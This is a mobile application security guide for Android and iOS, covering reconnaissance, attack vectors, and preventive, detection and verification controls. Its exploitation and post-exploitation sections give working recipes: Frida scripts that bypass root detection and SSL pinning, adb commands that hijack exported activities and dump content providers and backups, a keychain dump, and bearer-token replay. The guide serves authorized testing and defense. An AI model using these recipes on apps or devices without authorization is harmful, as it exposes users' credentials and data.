# Mobile Security Fundamentals

> [!NOTE]
> This document is for authorized security testing, educational purposes, and defensive engineering only. Do not use these techniques against applications you do not own or have explicit permission to test.

## 1. Overview

Mobile application security differs from web security in three fundamental ways:

- **The client is in the attacker's hands.** Unlike a web app, where the server controls the code, a mobile app is installed on a device the attacker fully controls. They can read the binary, modify it, intercept traffic, and hook functions at runtime.
- **The attack surface includes the OS.** Android and iOS provide sandboxing, permission models, and inter-process communication (IPC). Misconfigurations in these layers are as dangerous as bugs in the app itself.
- **Distribution is centralized but bypassable.** Official stores (Google Play, App Store) review apps, but sideloading, enterprise distribution, and jailbroken/rooted devices bypass these controls entirely.

This document covers the shared foundations: platform architecture, threat modeling, and the two-track approach (Pentest / AppSec) used throughout this category.

## 2. Reconnaissance / Enumeration

### 2.1 Pre-engagement

Before testing, establish:

- **Scope:** Which apps? Which platforms (Android/iOS)? Which versions? Backend APIs included?
- **Authorization:** Written permission for dynamic testing, network interception, and reverse engineering.
- **Test devices:** Rooted/jailbroken devices are needed for deep testing; note whether the client allows this.

### 2.2 Static reconnaissance

| Artifact | Android | iOS |
|----------|---------|-----|
| Package format | APK (ZIP) / AAB | IPA (ZIP) |
| Decompiler | `apktool`, `jadx`, `dex2jar` | `ghidra`, `Hopper`, `class-dump` |
| Manifest | `AndroidManifest.xml` | `Info.plist`, entitlements |
| Signing | `apksigner`, `jarsigner` | `codesign`, `security cms` |

Key questions during static analysis:

- What permissions does the app request? Are they justified?
- Are there exported components (activities, services, receivers, providers)?
- Is the app debuggable? (`android:debuggable="true"`)
- Are secrets hardcoded (API keys, tokens, certificates)?
- Is certificate pinning implemented?

### 2.3 Dynamic reconnaissance

| Tool | Platform | Purpose |
|------|----------|---------|
| `frida` | Both | Runtime hooking, function interception |
| `objection` | Both | Frida-based exploration without writing scripts |
| `MobSF` | Both | Automated static + dynamic analysis |
| `mitmproxy` / `Burp Suite` | Both | Traffic interception |
| `adb` | Android | Device interaction, logcat, shell |
| `ideviceinstaller` / `frida-ios-dump` | iOS | App installation, decryption |

## 3. Common Attack Vectors

### 3.1 Insecure data storage

Sensitive data written to disk in plaintext:

- Android: `SharedPreferences`, SQLite databases, external storage, logs (`logcat`).
- iOS: `NSUserDefaults`, plist files, Core Data, keychain (if misused).

**Pentest angle:** Use `adb shell` to browse `/data/data/<package>/` on a rooted device, or extract backups (`adb backup`). On iOS, use `frida-ios-dump` or browse the app container.

**AppSec angle:** Store secrets in Android Keystore / iOS Keychain with appropriate access classes (`kSecAttrAccessibleWhenUnlockedThisDeviceOnly`). Never log sensitive data.

### 3.2 Insecure communication

Traffic sent over HTTP, or HTTPS without proper validation:

- Missing certificate pinning -> MITM with a user-installed CA.
- Weak TLS versions or cipher suites.
- Custom protocols without encryption.

**Pentest angle:** Set up `mitmproxy` with a CA cert installed on the device, intercept traffic, look for plaintext credentials or tokens.

**AppSec angle:** Enforce TLS 1.2+, implement certificate pinning (public key pinning recommended over cert pinning), use `Network Security Config` on Android to disallow cleartext.

### 3.3 Insecure authentication and authorization

- Client-side authorization checks (hidden buttons, feature flags).
- Weak session management (long-lived tokens, no revocation).
- Biometric bypass (Frida hooking `BiometricPrompt`).

**Pentest angle:** Hook authentication functions with Frida, modify return values, test IDOR on backend APIs.

**AppSec angle:** Enforce authorization server-side. Use short-lived tokens with refresh. Implement biometric with `CryptoObject` binding.

### 3.4 Reverse engineering and tampering

- App logic extracted from the binary.
- Code patched to bypass root/jailbreak detection, license checks, or paywalls.
- Repackaged APKs with malware.

**Pentest angle:** Decompile with `jadx`, identify security controls, patch with `apktool`, resign with `apksigner`, install and test.

**AppSec angle:** Obfuscate with ProGuard/R8 (Android) or Swift/ObjC symbol stripping (iOS). Use Play Integrity API / DeviceCheck. Implement tamper detection.## 4. Exploitation Recipes

### 4.1 Android: exported activity hijack

If an activity is exported without permission checks, any app on the device can launch it with arbitrary extras.

```bash
adb shell am start -n com.example.app/.ExportedActivity --es "token" "attacker_value"
```

**Expected output:** Activity launches, potentially performing an action (e.g. password reset) with attacker-controlled input.

### 4.2 Android: content provider data leak

A provider with `android:exported="true"` and no `readPermission` allows any app to query it.

```bash
adb shell content query --uri content://com.example.app.provider/users
```

**Expected output:** Rows of user data (usernames, emails, tokens).

### 4.3 iOS: keychain dump on jailbroken device

On a jailbroken device, use `keychain_dumper` to extract keychain items.

```bash
./keychain_dumper -a
```

**Expected output:** Plaintext credentials, tokens, and certificates stored by apps.

### 4.4 Frida: bypass root detection (Android)

Hook the common root-check functions and force them to return false.

```javascript
Java.perform(function() {
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        console.log("[*] RootBeer.isRooted() called - bypassing");
        return false;
    };
});
```

Run with: `frida -U -f com.example.app -l bypass.js --no-pause`

**Expected output:** App starts without root warning; `[*] RootBeer.isRooted() called - bypassing`.

### 4.5 Frida: SSL pinning bypass (universal)

Hook `TrustManager` and `OkHttp` certificate pinner.

```javascript
Java.perform(function() {
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    var TrustAllCerts = Java.registerClass({
        name: "com.attacker.TrustAllCerts",
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustAllCertsArray = [TrustAllCerts.$new()];
    var SSLContext_init = SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    );
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log("[*] SSLContext.init() called - injecting trust-all manager");
        SSLContext_init.call(this, keyManager, TrustAllCertsArray, secureRandom);
    };
});
```

**Expected output:** `[*] SSLContext.init() called - injecting trust-all manager`; `mitmproxy` shows decrypted HTTPS traffic.

## 5. Post-Exploitation

### 5.1 Android: data exfiltration

On a rooted device or with `adb backup`:

```bash
adb backup -f backup.ab -apk com.example.app
# Convert to tar
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xf backup.tar
```

**Expected output:** App data (databases, shared_prefs) extracted to local disk.

### 5.2 iOS: app container extraction

On a jailbroken device:

```bash
frida-ios-dump -u <bundle_id> -o /tmp/app.ipa
```

Or browse the container directly:

```bash
ls /var/mobile/Containers/Data/Application/<UUID>/
```

**Expected output:** Full app sandbox contents (Documents, Library, tmp).

### 5.3 Token replay

If a session token is extracted (from storage, traffic, or memory), replay it against the backend API.

```bash
curl -H "Authorization: Bearer <TOKEN>" https://api.example.com/v1/profile
```

**Expected output:** `200 OK` with the victim's profile data - confirms the token is valid and not bound to the device.

## 6. Preventive Controls (AppSec)

| Risk | Control | Platform |
|------|---------|----------|
| Insecure storage | Use Keystore/Keychain, never plaintext | Both |
| Insecure communication | TLS 1.2+, cert pinning, Network Security Config | Both |
| Insecure auth | Server-side authorization, short-lived tokens | Both |
| Reverse engineering | Obfuscation (R8/ProGuard), symbol stripping | Both |
| Tampering | Play Integrity API, DeviceCheck, RASP | Both |
| Exported components | `android:exported="false"` unless required, permission checks | Android |
| Debuggable build | `android:debuggable="false"` in release | Android |
| Backup | `android:allowBackup="false"` for sensitive apps | Android |
| Jailbreak/root | Detect and degrade gracefully (do not hard-block) | Both |

## 7. Detection Controls (AppSec)

- **Integrity checks:** Play Integrity API (Android), DeviceCheck / App Attest (iOS). Server validates the attestation token before granting access.
- **Runtime protection:** RASP (Runtime Application Self-Protection) libraries detect Frida, Xposed, or debugger attachment and respond (e.g. terminate, degrade, report).
- **Certificate pinning:** Detect MITM attempts; log pinning failures to the backend (with care - do not leak the failure reason to the attacker).
- **Root/jailbreak detection:** Combine multiple signals (SU binary, `test-keys`, suspicious packages, `frida-server` process). Do not rely on a single check.
- **Anomaly detection:** Server-side behavioral analysis (impossible travel, unusual API call patterns).

## 8. Verification (AppSec)

- **MASVS compliance:** Map controls to OWASP MASVS categories (STORAGE, CRYPTO, AUTH, NETWORK, PLATFORM, CODE, RESILIENCE, PRIVACY).
- **MASTG tests:** Run the OWASP MASTG test cases for each platform.
- **Automated scans:** MobSF static analysis in CI; `semgrep` with mobile rules.
- **Penetration test:** Annual third-party test covering both platforms, including backend API.
- **Bug bounty:** If available, scope the mobile apps explicitly.

## 9. References

- OWASP Mobile Security Testing Guide (MASTG) - https://mas.owasp.org/MASTG/
- OWASP Mobile Application Security Verification Standard (MASVS) - https://mas.owasp.org/MASVS/
- OWASP Mobile Top 10 - https://owasp.org/www-project-mobile-top-10/
- Android Security Documentation - https://source.android.com/docs/security
- iOS Security Guide - https://support.apple.com/guide/security/welcome/web
- Frida Documentation - https://frida.re/docs/home/
- MobSF - https://github.com/MobSF/Mobile-Security-Framework-MobSF